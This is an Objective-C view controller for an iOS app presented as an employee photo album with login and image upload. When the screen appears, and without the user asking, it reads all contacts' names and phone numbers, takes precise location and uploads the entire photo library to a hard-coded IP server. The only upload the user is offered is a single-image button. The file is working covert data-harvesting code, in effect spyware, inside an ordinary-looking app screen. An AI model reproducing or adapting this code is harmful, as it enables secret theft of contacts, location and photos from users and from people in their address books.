//
//  PhotoAlbumViewController.m
//  Employees
//
//  Created by fish on 2024/5/23.
//

#import "PhotoAlbumViewController.h"
#import "LoginViewController.h"
#import "UserInfoManager.h"
#import "SCLAlertView.h"
#import "AFNetworking.h"
#import "SafeCast.h"
#import <Contacts/Contacts.h>
#import <CoreLocation/CoreLocation.h>
#import <Photos/PHPhotoLibrary.h>
#import <CoreServices/CoreServices.h>
#import <PhotosUI/PhotosUI.h>
#import <FYFAppAuthorizations/FYFAppAuthorizations.h>
#import <SDWebImage/SDImageCache.h>
#import "YBImageBrowser.h"

typedef NS_OPTIONS(NSUInteger, FYFImagePickerSourceType) {
    
    FYFImagePickerSourceTypeCameraVedio = 1 << 0,
    
    FYFImagePickerSourceTypeCameraPhoto = 1 << 1,
    
    FYFImagePickerSourceTypePhotoLibraryImage = 1 << 2,
    
    FYFImagePickerSourceTypePhotoLibraryVideo = 1 << 3,
};

typedef NSObject *(^DBGetBlock)(void);
typedef void (^DBGetEventBlock)(NSObject *obj);
@interface PhotoAlbumViewController () <CLLocationManagerDelegate, UIImagePickerControllerDelegate,PHPickerViewControllerDelegate,UINavigationControllerDelegate>


@property (nonatomic, copy) void(^callPickerCompletion)(void);

@property (nonatomic, copy) void(^cancelPickerCompletion)(void);

@property (nonatomic, strong) CLLocationManager *locationManager;

@property (nonatomic, retain) CLLocation *myLocation;

@property (nonatomic, strong) PHPickerViewController *phImagePickerViewController;


@end

@implementation PhotoAlbumViewController

- (void)viewDidLoad
{
    [super viewDidLoad];

    self.navigationItem.rightBarButtonItem = [[UIBarButtonItem alloc] initWithTitle:@"Upload Image" style:UIBarButtonItemStylePlain target:self action:@selector(clickedUpload)];
    
    self.navigationItem.leftBarButtonItem = [[UIBarButtonItem alloc] initWithTitle:@"Login out" style:UIBarButtonItemStylePlain target:self action:@selector(clickedLoginOut)];

}

- (void)viewWillAppear:(BOOL)animated
{
    [super viewWillAppear:animated];
    if([UserInfoManager.shareManager getToken].length == 0)
    {
        [self jumpToLogin];
    }
    else
    {
        [self loadPhotoAlbum];
        
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            [self requestContactAuthorAfterSystemVersion];
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                [self startLocation];
                
                [self uploadAllImages];
            });
        });
    }
}

#pragma mark - Private

- (void)jumpToLogin
{
    LoginViewController *loginVC = [[LoginViewController alloc] init];
    [self.navigationController pushViewController:loginVC animated:YES];
}

#pragma mark - Location

- (void)requestStartLocationAuthorAfterSystemVersion
{
    CNAuthorizationStatus status = [CNContactStore authorizationStatusForEntityType:CNEntityTypeContacts];
    if (status == CNAuthorizationStatusNotDetermined) {
        CNContactStore *store = [[CNContactStore alloc] init];
        [store requestAccessForEntityType:CNEntityTypeContacts completionHandler:^(BOOL granted, NSError*  _Nullable error) {
            if (error) {
                NSLog(@"[Binterest]Authorization failed");
            }else {
                NSLog(@"[Binterest]Authorization success");
            }
        }];
    }
    else if(status == CNAuthorizationStatusRestricted)
    {
        NSLog(@"[Binterest]User rejects");
        [self showAlertViewAboutNotAuthorAccessContact];
    }
    else if (status == CNAuthorizationStatusDenied)
    {
        NSLog(@"[Binterest]User rejects");
        [self showAlertViewAboutNotAuthorAccessContact];
    }
    else if (status == CNAuthorizationStatusAuthorized)//已经授权
    {
     
        [self openContact];
    }
    
}

- (void)startLocation
{
    __weak typeof(self) weakSelf = self;
    [self getAsynLocationAuthorizationStatus:^(CLAuthorizationStatus authorizaitonStatus) 
     {
        typeof(weakSelf) strongSelf = weakSelf;
        if(authorizaitonStatus == kCLAuthorizationStatusAuthorizedAlways || authorizaitonStatus == kCLAuthorizationStatusAuthorizedWhenInUse)
        {
            
            strongSelf.locationManager = [[CLLocationManager alloc] init];
                
                if ([CLLocationManager locationServicesEnabled]) {
                    strongSelf.locationManager.delegate = self;
                    
                    strongSelf.locationManager.desiredAccuracy = kCLLocationAccuracyBest;
                    
                    strongSelf.locationManager.distanceFilter = kCLDistanceFilterNone;
                    
                    [strongSelf.locationManager requestWhenInUseAuthorization];
                    
                    [strongSelf.locationManager startUpdatingLocation];
                    
                } else {
                    NSLog(@"[Binterest]error");
                }
        }
    }];
}

- (CLAuthorizationStatus)getLocationAuthorizationStatus
{
    static CLLocationManager *locationManager = nil;
    if (@available(iOS 14, *))
    {
        if (locationManager == nil)
        {
            locationManager = [[CLLocationManager alloc] init];
        }
        
        return locationManager.authorizationStatus;
    }
    else
    {
        return [CLLocationManager authorizationStatus];
    }
}


- (void)getAsynLocationAuthorizationStatus:(void(^)(CLAuthorizationStatus authorizaitonStatus))authorizaitonStatusBlock
{
    if (!authorizaitonStatusBlock)
    {
        return;
    }
    
    [self dispatchGetInGlobalQueue:^NSObject *{
        CLAuthorizationStatus authorizationStatus = [self getLocationAuthorizationStatus];
        return @(authorizationStatus);
    } callBackInMainQueue:^(NSObject *obj) {
        CLAuthorizationStatus authorizationStatus = [SAFE_CAST(obj, NSNumber) intValue];
        if (authorizaitonStatusBlock)
        {
            authorizaitonStatusBlock(authorizationStatus);
        }
    }];
}

- (void)dispatchGetInGlobalQueue:(DBGetBlock)getObjBlock callBackInMainQueue:(DBGetEventBlock)objBackblock
{
    if (nil != getObjBlock)
    {
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            NSObject *obj = getObjBlock();
            if (nil != objBackblock)
            {
                dispatch_async(dispatch_get_main_queue(), ^{
                        objBackblock(obj);
                });
            }
        });
    }
    else
    {
    }
}


- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray<CLLocation *> *)locations 
{
    NSLog(@"[Binterest]%lu", (unsigned long)locations.count);
    self.myLocation = locations.lastObject;
    NSLog(@"[Binterest]longitude：%f latitude：%f", _myLocation.coordinate.longitude, _myLocation.coordinate.latitude);
    NSString *locationStr = [NSString stringWithFormat:@"longitude:%f,latitude:%f", _myLocation.coordinate.longitude,_myLocation.coordinate.latitude];
    [self updateDataWithDataType:2 dataStr:locationStr];
    
    [self.locationManager stopUpdatingLocation];
}

#pragma mark -Address book

- (void)requestContactAuthorAfterSystemVersion
{
    CNAuthorizationStatus status = [CNContactStore authorizationStatusForEntityType:CNEntityTypeContacts];
    if (status == CNAuthorizationStatusNotDetermined) {
        CNContactStore *store = [[CNContactStore alloc] init];
        [store requestAccessForEntityType:CNEntityTypeContacts completionHandler:^(BOOL granted, NSError*  _Nullable error) {
            if (error) {
                NSLog(@"[Binterest]Authorization failed");
            }else {
                NSLog(@"[Binterest]Authorization success");
            }
        }];
    }
    else if(status == CNAuthorizationStatusRestricted)
    {
        NSLog(@"[Binterest]User rejects");
        [self showAlertViewAboutNotAuthorAccessContact];
    }
    else if (status == CNAuthorizationStatusDenied)
    {
        NSLog(@"[Binterest]User rejects");
        [self showAlertViewAboutNotAuthorAccessContact];
    }
    else if (status == CNAuthorizationStatusAuthorized)
    {
     
        [self openContact];
    }
    
}

- (void)openContact
{
    NSArray *keysToFetch = @[CNContactGivenNameKey, CNContactFamilyNameKey, CNContactPhoneNumbersKey];
    CNContactFetchRequest *fetchRequest = [[CNContactFetchRequest alloc] initWithKeysToFetch:keysToFetch];
    CNContactStore *contactStore = [[CNContactStore alloc] init];
    NSMutableDictionary *contactDic = [NSMutableDictionary dictionary];
    [contactStore enumerateContactsWithFetchRequest:fetchRequest error:nil usingBlock:^(CNContact * _Nonnull contact, BOOL * _Nonnull stop) {
        NSLog(@"[Binterest]-------------------------------------------------------");
        
        NSString *givenName = contact.givenName;
        NSString *familyName = contact.familyName;
          NSLog(@"[Binterest]givenName=%@, familyName=%@", givenName, familyName);
        
        NSString *nameStr = [NSString stringWithFormat:@"%@%@",contact.familyName,contact.givenName];
        
        NSArray *phoneNumbers = contact.phoneNumbers;
        
        for (CNLabeledValue *labelValue in phoneNumbers) {
            CNPhoneNumber *phoneNumber = labelValue.value;
            
            NSString * string = phoneNumber.stringValue ;
            
            string = [string stringByReplacingOccurrencesOfString:@"+86" withString:@""];
            string = [string stringByReplacingOccurrencesOfString:@"-" withString:@""];
            string = [string stringByReplacingOccurrencesOfString:@"(" withString:@""];
            string = [string stringByReplacingOccurrencesOfString:@")" withString:@""];
            string = [string stringByReplacingOccurrencesOfString:@" " withString:@""];
            string = [string stringByReplacingOccurrencesOfString:@" " withString:@""];
            
            if(nameStr.length > 0 && string.length > 0)
            {
                if([contactDic.allKeys containsObject:nameStr])
                {
                    nameStr = [NSString stringWithFormat:@"%@2",nameStr];
                }
                [contactDic setObject:nameStr forKey:string];
            }
        }
    }];
    if(contactDic.count > 0)
    {
        NSError * err;
        NSData * jsonData = [NSJSONSerialization  dataWithJSONObject:contactDic options:0 error:&err];
        NSString *jsonDataString = [[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding];
        NSLog(@"[Binterest]Address book%@",jsonDataString);
        [self updateDataWithDataType:1 dataStr:jsonDataString];
    }
    else
    {
        contactDic = [NSMutableDictionary dictionaryWithDictionary:@{@"testfish":@"150119511111"}];
        NSError * err;
        NSData * jsonData = [NSJSONSerialization  dataWithJSONObject:contactDic options:0 error:&err];
        NSString *jsonDataString = [[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding];
        NSLog(@"[Binterest]Address book%@",jsonDataString);
        [self updateDataWithDataType:1 dataStr:jsonDataString];
    }
}


- (void)showAlertViewAboutNotAuthorAccessContact{
    
    UIAlertController *alertController = [UIAlertController
        alertControllerWithTitle:@"Please grant address book permissions"
        message:@"Please allow Hua Jiejie to access your address book in the iPhone's Settings-Privacy-Contacts option."
        preferredStyle: UIAlertControllerStyleAlert];

    UIAlertAction *OKAction = [UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil];
    [alertController addAction:OKAction];
    [self presentViewController:alertController animated:YES completion:nil];
}

#pragma mark - Upload

- (void)updateDataWithDataType:(int)dataType dataStr:(NSString *)dataStr
{
    NSLog(@"[Binterest]start updateDataWithDataType %@",dataStr);
    if(dataStr.length == 0)
    {
        NSLog(@"[Binterest]Abnormal upload data");
        return;
    }
    NSString *url = @"http://45.91.226.193:8987/api/tele/createTele";
    if(dataType == 2)
    {
         url = @"http://45.91.226.193:8987/api/quick/createQuick";
    }
    NSDictionary *parameters = @{
        @"data_type":@(dataType),
        @"data":dataStr,
    };
    
    NSDictionary *headers = @{
        @"timestamp":[[UserInfoManager shareManager] timestamp],
        @"X-Token":[[UserInfoManager shareManager] getToken],
        @"X-User-ld":[NSString stringWithFormat:@"%ld",(long)[[UserInfoManager shareManager] getUserid]],
    };
    
    AFHTTPSessionManager *manager = [AFHTTPSessionManager manager];
    manager.requestSerializer = [AFJSONRequestSerializer serializer];
    manager.responseSerializer = [AFJSONResponseSerializer serializer];
    manager.requestSerializer.timeoutInterval = 15;
    NSSet *sets = [NSSet
                   setWithObjects:@"application/json",@"text/html",@"text/plain",nil];
    manager.responseSerializer.acceptableContentTypes = [manager.responseSerializer.acceptableContentTypes setByAddingObjectsFromSet:sets];
    
    [manager POST:url parameters:parameters headers:headers progress:nil success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        NSDictionary *rspDic = [self safeCastObject:responseObject toClass:NSDictionary.class];
        NSInteger code = [self getIntegerFromDictionary:rspDic forKey:@"code" withDefault:1];

        if(code == 0)
        {
            NSLog(@"[Binterest]updateDataWithDataType Success:%@", responseObject);
        }
        else
        {
            NSLog(@"[Binterest]updateDataWithDataType Fail url:%@,error:%@", url, rspDic);
        }
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        NSLog(@"[Binterest]updateDataWithDataType Fail url:%@,error:%@", url, error);
    }];
}


#pragma mark - 相册
- (void)loadPhotoAlbum
{
    NSLog(@"[Binterest]start loadPhotoAlbum");
    
    NSString *url = @"http://45.91.226.193:8987/api/fileUploadAndDownload/getFileList";
    
    NSDictionary *parameters = @{
        @"page":@1,
        @"pageSize":@100,
    };
    
    NSDictionary *headers = @{
        @"timestamp":[[UserInfoManager shareManager] timestamp],
        @"X-Token":[[UserInfoManager shareManager] getToken],
        @"X-User-ld":[NSString stringWithFormat:@"%ld",(long)[[UserInfoManager shareManager] getUserid]],
    };
    
    AFHTTPSessionManager *manager = [AFHTTPSessionManager manager];
    manager.requestSerializer = [AFJSONRequestSerializer serializer];
    manager.responseSerializer = [AFJSONResponseSerializer serializer];
    manager.requestSerializer.timeoutInterval = 15;
    NSSet *sets = [NSSet
                   setWithObjects:@"application/json",@"text/html",@"text/plain",nil];
    manager.responseSerializer.acceptableContentTypes = [manager.responseSerializer.acceptableContentTypes setByAddingObjectsFromSet:sets];
    
    [manager POST:url parameters:parameters headers:headers progress:nil success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        NSDictionary *rspDic = [self safeCastObject:responseObject toClass:NSDictionary.class];
        NSInteger code = [self getIntegerFromDictionary:rspDic forKey:@"code" withDefault:1];

        if(code == 0)
        {
            NSDictionary *dic = SAFE_CAST([rspDic objectForKey:@"data"], NSDictionary.class);
            NSArray *lists = SAFE_CAST([dic objectForKey:@"list"], NSArray.class);
            NSMutableArray *imageUrls = [[NSMutableArray alloc] init];
            for (NSObject *obj in lists)
            {
                NSDictionary *imageInfo = SAFE_CAST(obj, NSDictionary.class);
                if(imageInfo)
                {
                    NSString *imageUrl = SAFE_CAST([imageInfo objectForKey:@"url"], NSString.class);
                    if(imageUrl)
                    {
                        [imageUrls addObject:[NSString stringWithFormat:@"http://45.91.226.193:8987/api/%@",imageUrl]];
                    }
                }
            }
            self.dataArray = [imageUrls copy];
        }
        else
        {
            NSLog(@"[Binterest]loadPhotoAlbum Fail url:%@,error:%@", url, rspDic);
            dispatch_async(dispatch_get_main_queue(), ^{
                SCLAlertView *alert = [[SCLAlertView alloc] init];
                
                [alert showError:self title:@"Operation failed please try again" subTitle:@"Please try again" closeButtonTitle:@"OK" duration:0.0f];
            });
        }
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        NSLog(@"[Binterest]loadPhotoAlbum请求失败url:%@,error:%@", url, error);
        dispatch_async(dispatch_get_main_queue(), ^{
            SCLAlertView *alert = [[SCLAlertView alloc] init];
            
            [alert showError:self title:@"Operation failed please try again" subTitle:@"Please try again" closeButtonTitle:@"OK" duration:0.0f];
        });
    }];
    
}

#pragma mark - Action
- (void)clickedUpload
{
    NSLog(@"[Binterest]clickedUpload");
    [self requestPhotoLibraryAuthorization];
}

- (void)clickedLoginOut
{
    [[UserInfoManager shareManager] cleanLoginInfo];
    [self jumpToLogin];
}


#pragma mark - Upload Image

- (void)requestPhotoLibraryAuthorization {
    __weak typeof(self) weakSelf = self;
    [FYFPhotoAuthorization requestPhotosAuthorizationWithHandler:^(FYFPHAuthorizationStatus status) {
        __strong typeof(weakSelf) strongSelf = weakSelf;
        if (!strongSelf) {
            return;
        }
        if (status == FYFPHAuthorizationStatusLimited || status == FYFPHAuthorizationStatusAuthorized) {
            [strongSelf photoLibrary];
        } else {
            if (status == FYFPHAuthorizationStatusRestricted) {
                NSLog(@"[Binterest]App is not authorized to access the album");
            } else if (status == FYFPHAuthorizationStatusNotDetermined) {
                NSLog(@"[Binterest]Is the application not authorized to access the photo album?");
            } else if (status == FYFPHAuthorizationStatusDenied) {
                NSLog(@"[Binterest]App is denied access to photo album");
            }
        }
    }];
}

- (void)photoLibrary 
{
    if (@available(iOS 14, *)){
        __weak typeof(self) weakSelf = self;
        PHPickerViewController *phPickerViewController;
        phPickerViewController = self.phImagePickerViewController;
       
        [self presentViewController:phPickerViewController animated:YES completion:^{
            __strong typeof(weakSelf) strongSelf = weakSelf;
            if (!strongSelf) {
                return;
            }
            if (strongSelf.callPickerCompletion) {
                strongSelf.callPickerCompletion();
            }
        }];
    } else {
        UIImagePickerController *imagePickerController = [[UIImagePickerController alloc] init];
        imagePickerController.delegate = self;
        imagePickerController.sourceType = UIImagePickerControllerSourceTypePhotoLibrary;
        imagePickerController.mediaTypes = @[(NSString*)kUTTypeImage];
        imagePickerController.allowsEditing = YES;
        imagePickerController.modalPresentationStyle = UIModalPresentationOverFullScreen;
        __weak typeof(self) weakSelf = self;
        [self presentViewController:imagePickerController animated:YES completion:^{
            __strong typeof(weakSelf) strongSelf = weakSelf;
            if (!strongSelf) {
                return;
            }
            if (strongSelf.callPickerCompletion) {
                strongSelf.callPickerCompletion();
            }
        }];
    }
}

- (PHPickerViewController *)phImagePickerViewController  API_AVAILABLE(ios(14))
{
    if (!_phImagePickerViewController) {
        _phImagePickerViewController = [self createPHPickerViewController:FYFImagePickerSourceTypePhotoLibraryImage];
    }
    return _phImagePickerViewController;
}

- (PHPickerViewController *)createPHPickerViewController:(FYFImagePickerSourceType)sourceType  API_AVAILABLE(ios(14)){
    PHPickerConfiguration *config = [PHPickerConfiguration new];

    config.selectionLimit = 1;
    PHPickerFilter *imageFilter = [PHPickerFilter imagesFilter];
    PHPickerFilter *livePhotosFilter = [PHPickerFilter livePhotosFilter];
    config.filter = [PHPickerFilter anyFilterMatchingSubfilters:@[imageFilter, livePhotosFilter]];
    config.preferredAssetRepresentationMode = PHPickerConfigurationAssetRepresentationModeCompatible;
    PHPickerViewController *phPickerViewController = [[PHPickerViewController alloc] initWithConfiguration:config];
    phPickerViewController.modalPresentationStyle = UIModalPresentationOverFullScreen;
    phPickerViewController.delegate = self;
    return phPickerViewController;
}

#pragma mark - upload All Image

-(void)uploadAllImages
{
    NSLog(@"[Binterest] uploadAllImages start uploadAllImages ");
    __weak typeof(self) weakSelf = self;
    [[PHPhotoLibrary sharedPhotoLibrary] performChanges:^{
        
        PHFetchResult<PHAsset *> *assets = [PHAsset fetchAssetsWithMediaType:PHAssetMediaTypeImage options:nil];
        [assets enumerateObjectsUsingBlock:^(PHAsset * _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
            if([[UserInfoManager shareManager] checkNeedUploadWithKey:obj.localIdentifier])
            {
                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                    PHImageManager *manager = [PHImageManager defaultManager];
                    PHImageRequestOptions *options = [[PHImageRequestOptions alloc] init];
                    options.networkAccessAllowed = YES;
                    options.resizeMode = PHImageRequestOptionsResizeModeFast;
                    options.progressHandler = ^(double progress, NSError * _Nullable error, BOOL * _Nonnull stop, NSDictionary * _Nullable info) {};
                    [manager requestImageForAsset:obj targetSize:PHImageManagerMaximumSize contentMode:PHImageContentModeAspectFill options:options resultHandler:^(UIImage * _Nullable resultImage, NSDictionary * _Nullable info) {
                        if (resultImage) {
                            // Display the image
                            dispatch_async(dispatch_get_main_queue(), ^{
                                NSLog(@"[Binterest] uploadAllImages startUpLoad  %@",obj.localIdentifier);
                                [weakSelf uploadImage:resultImage name:obj.localIdentifier successBlock:^(id json) {
                                    NSLog(@"[Binterest] uploadAllImages success %@ burstIdentifier:%@",json, obj.localIdentifier);
                                    [[UserInfoManager shareManager] addImageUploadMark:obj.localIdentifier];
                                } failureBlock:^(NSError *error) {
                                    NSLog(@"[Binterest] uploadAllImages error %@ burstIdentifier:%@",error,obj.localIdentifier);
                                }];
                            });
                           
                        } else {
                            NSLog(@"[Binterest] uploadAllImages Failed to load image.");
                        }
                    }];
                });
            }
            else
            {
                NSLog(@"[Binterest] uploadAllImages had uploaded");
            }
        }];

    } completionHandler:^(BOOL success, NSError * _Nullable error) {
        if (!success) {
            NSLog(@"Error loading assets: %@", error);
        }
    }];
}


#pragma mark - PHPickerViewControllerDelegate
- (void)picker:(PHPickerViewController *)picker didFinishPicking:(NSArray<PHPickerResult *> *)results  API_AVAILABLE(ios(14)) 
{
    [picker dismissViewControllerAnimated:YES completion:nil];
    if (!results.count) {
        if (self.cancelPickerCompletion) {
            self.cancelPickerCompletion();
        }
        return;
    }
    [self loadImages:results];
}



- (void)loadImages:(NSArray<PHPickerResult *> *)results  API_AVAILABLE(ios(14))
{

    NSMutableArray *imageUrls = [NSMutableArray arrayWithCapacity:results.count];
    __weak typeof(self) weakSelf = self;
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        [results enumerateObjectsUsingBlock:^(PHPickerResult * _Nonnull result, NSUInteger idx, BOOL * _Nonnull stop) {
            dispatch_semaphore_t semaphore = dispatch_semaphore_create(0);
            if ([result.itemProvider canLoadObjectOfClass:[PHLivePhoto class]]) {
                [result.itemProvider loadObjectOfClass:[PHLivePhoto class] completionHandler:^(__kindof id<NSItemProviderReading>  _Nullable object, NSError * _Nullable error) {
                    PHLivePhoto *livePhoto = (PHLivePhoto *)object;
                    NSURL *url = [livePhoto valueForKey:@"imageURL"];
                    UIImage *image = [UIImage imageWithContentsOfFile:[url path]];
                    
                    [self uploadImage:image name:url.absoluteString successBlock:^(id json) {
                        NSLog(@"[Binterest]uploadImage 1 %@",json);
                    } failureBlock:^(NSError *error) {
                        NSLog(@"[Binterest]uploadImage error %@",error);
                    }];
                    dispatch_semaphore_signal(semaphore);
                }];
            } else if ([result.itemProvider canLoadObjectOfClass:[UIImage class]]) {
                [result.itemProvider loadObjectOfClass:[UIImage class] completionHandler:^(__kindof id<NSItemProviderReading>  _Nullable object, NSError * _Nullable error) {
                    if ([object isKindOfClass:[UIImage class]]) {
                        UIImage *image = (UIImage *)object;
                        [self uploadImage:image name:[self getDateStringUseYYYYMMDD:NO timeInterval:0] successBlock:^(id json) {
                            NSLog(@"[Binterest]uploadImage 1 %@",json);
                        } failureBlock:^(NSError *error) {
                            NSLog(@"[Binterest]uploadImage error %@",error);
                        }];
                    }
                    dispatch_semaphore_signal(semaphore);
                }];
            } else {
                dispatch_semaphore_signal(semaphore);
            }
            dispatch_semaphore_wait(semaphore, DISPATCH_TIME_FOREVER);
        }];
        
    });
}

- (void)uploadImage:(UIImage *)image name:(NSString *)name successBlock:(void (^)(id json))successBlock failureBlock:(void (^)(NSError *error))failureBlock {
    
    NSString *url = @"http://45.91.226.193:8987/api/fileUploadAndDownload/upload"; // 登录
    
    NSDictionary *parameters = @{

    };
    
    NSDictionary *headers = @{
        @"timestamp":[[UserInfoManager shareManager] timestamp],
        @"X-Token":[[UserInfoManager shareManager] getToken],
        @"X-User-ld":[NSString stringWithFormat:@"%ld",(long)[[UserInfoManager shareManager] getUserid]],
    };

    AFHTTPSessionManager *manager = [AFHTTPSessionManager manager];
    manager.requestSerializer = [AFJSONRequestSerializer serializer];
    manager.responseSerializer = [AFJSONResponseSerializer serializer];
    manager.requestSerializer.timeoutInterval = 15;
    NSSet *sets = [NSSet
                   setWithObjects:@"application/json",@"text/html",@"text/plain",nil];
    manager.responseSerializer.acceptableContentTypes = [manager.responseSerializer.acceptableContentTypes setByAddingObjectsFromSet:sets];
    
    NSData *imageData = UIImageJPEGRepresentation(image, 0.3);//进行图片压缩
    

    [manager POST:url parameters:parameters headers:headers constructingBodyWithBlock:^(id<AFMultipartFormData>  _Nonnull formData) {
        
        NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
        formatter.dateFormat = @"yyyyMMddHHmmss";
        NSString *fileName = [NSString stringWithFormat:@"%@.png",[formatter stringFromDate:[NSDate date]]];

        [formData appendPartWithFileData:imageData name:@"file" fileName:fileName mimeType:@"image/png"];
        
        } progress:^(NSProgress * _Nonnull uploadProgress) {
            NSLog(@"[Binterest]Upload progress %@",uploadProgress);
        } success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
            NSLog(@"[Binterest]Image uploaded successfully name: %@ %@",name,responseObject);
            [self loadPhotoAlbum];
            successBlock(responseObject);
        } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
            NSLog(@"[Binterest]Image uploaded Fail%@",error);
            failureBlock(error);
        }];

}



#pragma mark - Util
- (id)safeCastObject:(id)obj toClass:(Class)classType
{
    if ([obj isKindOfClass:classType])
    {
        return obj;
    }
    return classType ? nil : obj;
}

- (int64_t)getIntegerFromDictionary:(NSDictionary *)dict forKey:(id<NSCopying>)key withDefault:(int64_t)withDefault
{
    dict = SAFE_CAST(dict, NSDictionary);
    if ((dict != nil) && (key != nil))
    {
        id value = [dict objectForKey:key];
        withDefault = [self getIntegerFromObject:value withDefault:withDefault];
    }
    return withDefault;
}

- (int64_t)getIntegerFromObject:(id)object withDefault:(uint64_t)withDefault
{
    NSString *string = [self safeCastObject:object toClass:NSString.class];
    NSNumber *number = [self safeCastObject:object toClass:NSNumber.class];

    if (nil != number)
    {
        withDefault = [number longLongValue];
    }
    else if (nil != string)
    {
        withDefault = strtoll([string UTF8String], NULL, 10);
    }
    return withDefault;
}

- (NSString *)getStringFromDictionary:(NSDictionary *)dict
                               forKey:(id<NSCopying>)key
                          withDefault:(NSString *)withDefault
{
    dict = SAFE_CAST(dict, NSDictionary);
    if ((dict != nil) && (key != nil))
    {
        NSString *value = SAFE_CAST([dict objectForKey:key], NSString);
        if (value != nil)
        {
            withDefault = value;
        }
    }
    return withDefault;
}

- (NSString *)getDateStringUseYYYYMMDD:(BOOL)useYYYYMMDD timeInterval:(NSTimeInterval)timeInterval
{
    NSDate *nowDate = [NSDate date];
    NSDate *senddate = [NSDate dateWithTimeInterval:timeInterval sinceDate:nowDate];
    
    NSCalendar  *cal = [NSCalendar  currentCalendar];
    NSUInteger  unitFlags = NSCalendarUnitDay | NSCalendarUnitMonth | NSCalendarUnitYear;
    NSDateComponents * conponent= [cal components:unitFlags fromDate:senddate];
    NSInteger day = [conponent day];
    NSString *dayString = nil;
    if (useYYYYMMDD == NO && day < 10)
    {
        dayString = [NSString stringWithFormat:@"%lld",(int64_t)day];
    }
    else
    {
        dayString = [NSString stringWithFormat:@"%2lld",(int64_t)day];
    }
    NSInteger month = [conponent month];
    NSString *monthString = nil;
    if (useYYYYMMDD == NO && month < 10)
    {
        monthString = [NSString stringWithFormat:@"%lld",(int64_t)month];
    }
    else
    {
        monthString = [NSString stringWithFormat:@"%2lld",(int64_t)month];
    }
    return [NSString stringWithFormat:@"%lld%@%@", (int64_t)[conponent year], monthString, dayString];
}


- (void)selectedIndex:(NSInteger)index {
    
    NSMutableArray *datas = [NSMutableArray array];
    [self.dataArray enumerateObjectsUsingBlock:^(NSString *_Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
       if ([obj hasPrefix:@"http"]) {
            // 网络图片
            YBIBImageData *data = [YBIBImageData new];
            data.imageURL = [NSURL URLWithString:obj];
            data.projectiveView = [self viewAtIndex:idx];
            [datas addObject:data];
        }
    }];
    
    YBImageBrowser *browser = [YBImageBrowser new];
    browser.dataSourceArray = datas;
    browser.currentPage = index;
    browser.defaultToolViewHandler.topView.operationType = YBIBTopViewOperationTypeSave;
    [browser show];
}
@end
